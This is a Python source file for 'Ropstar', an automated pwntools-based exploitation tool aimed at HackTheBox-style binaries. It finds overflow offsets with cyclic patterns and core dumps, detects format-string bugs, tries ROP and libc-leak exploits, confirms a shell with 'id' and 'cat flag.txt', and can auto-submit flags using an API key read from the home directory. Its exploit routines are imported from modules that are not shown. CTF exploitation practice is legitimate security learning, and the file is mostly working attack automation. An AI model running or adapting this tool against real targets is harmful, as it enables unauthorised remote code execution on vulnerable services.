#!/usr/bin/python
from pwn import *
import requests
import sys
import os
import re
import argparse
from leak import Leak
from exploit import Exploit
from utils import *
from colorama import Fore, Back, Style
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

# Author: xct

class Ropstar():
	def __init__(self, argv):
		parser = argparse.ArgumentParser(description='Pwn things, fast.')
		parser.add_argument('bin',help='target binary (local)')
		parser.add_argument('-rhost',help='target host')
		parser.add_argument('-rport', help='target port (required if -rhost is set)')
		parser.add_argument('-cid', help='challenge id for hackthebox challenges (to auto submit flags)')
		parser.add_argument('-o', help='specify offset manually, skips dynamic resolution')
		parser.add_argument('-p', help='use proxy, e.g. https://127.0.0.1:8080')
		parser.add_argument('-m', help='specify address of main method, in case there is no symbols')
		parser.add_argument('-xor', help='xor payload with given byte')		
		parser.add_argument('-win', help='specify win function address to call')	
		parser.add_argument('-magic', help='magic string that needs to be send before the payload')													
		self.args = parser.parse_args()
		self.username = os.getlogin()	
		if self.args.cid:
			with open('/home/'+self.username+'/.htb_apikey','r') as f:
				self.api_key = f.read()
				log.success("Read api_key: "+self.api_key[:6]+"...")				
		# set context
		context.endian = "little"
		context.os = "linux"
		context.log_level = "debug"		
		context.timeout = 10	
		self.t = Timeout()
		self.bname = self.args.bin
		self.binary = ELF(self.bname )
		self.arch = self.binary.get_machine_arch()
		log.info("Arch: "+self.arch)
		if self.arch  == 'i386':
			context.bits = 32
			context.arch = self.arch 
			context.kernel = self.arch 
			self.pattern_reg = "eip"
		else:
			context.bits = 64
			context.arch = self.arch 
			context.kernel = self.arch 
			self.pattern_reg = "rsp"		
		self.offset = -1
		self.leak = Leak(self)	
		self.exploit = Exploit(self)
		# identity + rot13 for now
		self.encodings = [lambda x: x, lambda x: rot13(x)]
		if self.args.xor:
			self.encodings.append(lambda x: xor(x, self.args.xor))
		# some config options
		self.pattern_length = 2000


	def connect(self):
		''' Connects to remote or local binary
		'''
		p = None
		if self.args.rhost and self.args.rport:
			log.info("Using remote target "+self.args.rhost+":"+self.args.rport)	
			p = remote(self.args.rhost, self.args.rport)
		else:
			log.info("Using local target")	
			# env={'LD_PRELOAD': os.path.join(os.getcwd(), 'libc.so.6')}
			p = process(self.bname)
		return p


	def trigger(self, p, payload):
		''' function that puts payload into vulnerable buffer
		'''
		result = ''
		if self.args.magic:
			p.sendline(self.args.magic)
		p.sendline(payload)
		# the amount of lines that need to be read 
		# before getting the result depends on the binary so we
		# read a lot
		try:
			result = p.recvlines(numlines=100, timeout=1)
		except EOFError:
			pass
		return result


	def trigger_fmt(self, payload):	
		''' alternative to trigger for fmt string exploits (connects on its own)
		'''	
		p = self.connect()
		result = ''
		if self.args.magic:
			p.sendline(self.args.magic)
		p.sendline(payload)
		try:
			result = p.recvall()			
			pattern = "(START0[xX][0-9a-fA-F]{4,8}END)"
			m = re.search(pattern, result)			
			if m:
				result = m.groups(1)[0]
				log.info('FmtStr leak: '+result.strip("START").strip("END"))		
		except EOFError:
			pass
		p.close()
		return result


	def submit_challenge_flag(self, flag):
		''' Submit flag to htb
		'''
		url = 'https://www.hackthebox.eu/api/challenges/own/?api_token='+self.api_key
		data =  {'challenge_id':self.args.cid, 'flag': flag, "difficulty": 1}
		data_str = "&".join("%s=%s" % (k,v) for k,v in data.items())
		headers = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
		if not self.args.p:
			r = requests.post(url, data=data_str, headers=headers, verify=False)
		else:
			r = requests.post(url, data=data_str, headers=headers, verify=False, proxies={'https':self.args.p})
		log.info("Result: "+str(r.status_code))

	
	def get_dynamic(self):
		''' get offset with unique pattern
		'''
		for enc in self.encodings:
			p = process(self.bname)
			pattern = cyclic(self.pattern_length)
			pattern = enc(pattern)
			if self.args.magic:
				p.sendline(self.args.magic)			
			p.sendline(pattern)
			p.wait()
			p.close()
			core = Coredump('./core')
			log.info("Fault: "+hex(core.fault_addr))
			addr = core.fault_addr & 0x000000ffffffff # have to make it 32 bit or cyclic crashes
			self.offset = cyclic_find(addr)
			# offset can not be higher than the pattern length
			if self.offset > self.pattern_length:
				continue
			if self.offset != -1:
				log.success("Offset: "+str(self.offset))
				return True
		log.failure("Can not get offset")
		return False


	def check_success(self, p):
		''' Check if we can execute shell commands and submit the flag when doing htb challenges
		'''
		try:
			p.sendline("id")
			out = p.recvline()
			log.success(out)
			if len(out) > 0:
				p.sendline("cat flag.txt")
				flag = p.recvline()
				if self.args.cid and len(flag) > 0 and flag.find('No such file or directory') == -1:
					self.submit_challenge_flag(flag.strip("\n"))
					log.success("Submitted flag: "+flag)
					#log.success("Submitted flag: <censored>")						
				else:
					log.info("Not submitted")
				log.info('Time spent: '+str(round((time.time() - self.start_time),2))+'s')	
				p.interactive()
				return True
		except EOFError:
			log.failure("Failed")
			pass
		return False


	def main(self):
		self.start_time = time.time()
		# offset can also be given on command line
		if not self.args.o:
			# resolve offset dynamically
			log.info("Getting offset")
			result = self.get_dynamic()
			if not result:
				# no offset found via simple overflow, maybe fmt string?
				offset = -1
				try:
					autofmt = FmtStr(self.trigger_fmt)
					if autofmt.offset == -1:
						log.failure("Could not find format string vuln")
						return
					p = self.connect()					
					self.exploit.fmt(p, autofmt)
					p.close()							
					return
				except IndexError:
					log.failure("Could not find format string vuln")
					return
		else:
			self.offset = int(self.args.o)
			log.info("Offset: "+str(self.offset))

		
		# leakless works for static & non-static binaries
		log.info("Checking for leakless exploitation")
		p = self.connect()	
		if self.exploit.bss(p):
			p.close()
			return
		# static compiled binaries get their gadgets from their elf
		if not self.binary.libc:
			if self.exploit.static(p):
				p.close()
				return
		p.close()

		# dynamic complied binary, try leaking libc & exploiting via libc
		log.info("Getting Leak")
		p = self.connect()		
		leak = self.leak.get_leak(p)
		p.close()
		if len(leak) > 0:
			log.info("Getting libc version")
			versions = self.leak.get_libc(leak)
			exploits = [self.exploit.bss,self.exploit.bss_execve,self.exploit.default]
			for version in versions:
				for exploit in exploits:
					p = self.connect()
					leak = self.leak.get_leak(p)
					if len(leak) == 0:
						continue
					log.info("Using "+version)
					try:
						libc = ELF(version) # take first hit for now
					except IOError:
						log.failure("Could not load "+version+ "(skipping)")
						continue
					name, addr = leak.items()[0]
					libc_base = addr - libc.symbols[name]
					log.success("Libc base: {0}".format(hex(libc_base)))
					# exploit
					log.info("Running exploits")
					try:
						if exploit(p, libc, libc_base):
							log.success("Done!")
							return				
					except EOFError:
						pass
				p.close()
		else:
			log.failure("Could not leak anything")


if __name__ == '__main__':
	logo = r"""
                          __            
   _________  ____  _____/ /_____ ______
  / ___/ __ \/ __ \/ ___/ __/ __ `/ ___/  
 / /  / /_/ / /_/ (__  ) /_/ /_/ / /    
/_/   \____/ .___/____/\__/\__,_/_/     
          /_/                           
    				xct@vulndev.io      
	"""
	print(Fore.RED+logo+Style.RESET_ALL)
	app = Ropstar(sys.argv)
	app.main()
